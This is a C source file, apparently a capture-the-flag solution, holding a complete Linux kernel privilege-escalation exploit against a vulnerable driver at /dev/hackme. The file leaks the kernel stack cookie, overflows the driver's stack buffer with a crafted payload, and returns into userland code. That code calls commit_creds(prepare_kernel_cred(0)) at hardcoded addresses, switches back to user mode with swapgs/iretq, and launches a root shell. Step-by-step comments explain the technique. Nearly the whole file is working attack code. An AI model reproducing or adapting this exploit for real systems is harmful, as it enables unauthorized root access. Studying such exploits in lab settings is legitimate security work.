#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

int global_fd;
void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
    if(global_fd < 0){
        puts("failed to open device");
        exit(-1);
    }else{
        puts("[+] Device opened.");
    }
}

void get_shell(void){
    puts("[+] ret2usr");
    if (getuid() == 0){
        printf("[+] Got root!\n");
        char *args[] = {"/bin/sh", NULL};
        execvp(args[0], args);
    } else {
        printf("[!] Didn't get root\n");
        exit(-1);
    }
}

unsigned long cookie; // 8 bytes
void leak(void){
    // the tmp var in ko file is 32 length and the stack cookie is after it
    // we will read 8 bytes using unsigned long
    // the cookie will be at offset 16
    unsigned n = 20;
    unsigned long leak[n];

    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];
    
    printf("[+] Cookie: %lx\n", cookie);
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

unsigned long user_rip = (unsigned long)get_shell;
void privEsc(){
    // we will try to escalate the process to root
    // we will not jmp or execute system("/bin/sh") or something like that
    // 0xffffffff814c6410 -> commit_creds
    // 0xffffffff814c67f0 -> prepare_kernel_cred
    // we will use it as commit_creds(prepare_kernel_cred(0))
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi,rax;"
        "mov rax, 0xffffffff814c6410;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void overflow(void){
    // the kernel function pops 3 registers rbx, r12, rbp instaed of just rbp
    // we have to put 3 dummy values after the cookie
    // then send the return address to the function that we will craft on the userland
    // to achive root privileges
    unsigned n = 50;
    unsigned long payload[n];
    unsigned offset = 16;
    payload[offset++]  = cookie;
    payload[offset++] += 0x0; // dummy rbx
    payload[offset++] += 0x0; // dummy r12
    payload[offset++] += 0x0; // dummy rbp
    payload[offset++] += (unsigned long) privEsc; // ret

    // ssize_t used for functions whose return value could either be a valid size, or a negative value to indicate an error
    ssize_t r = write(global_fd, payload, sizeof(payload));
    puts("[-] Overflow Puts");
}

void save_state(){
    // if we execute the privEsc function we wstill in the kernel_mode
    // so we have to return to user-mode
    // in kernel we will return to user-mode using one of these sysretq/iretq
    // the sysretq is complicated to get right so we will uses iretq
    // The iretq instruction just requires the stack to be setup with 5 userland
    // registers values in order: RIP | CS | RFLAGS | SP | SS
    // RIP : we can simply set this to be the address of the function that pops a shell
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

int main() {

    save_state();
    open_dev();
    leak();
    overflow();

    puts("[-] Should never be reched");
    return 0;
}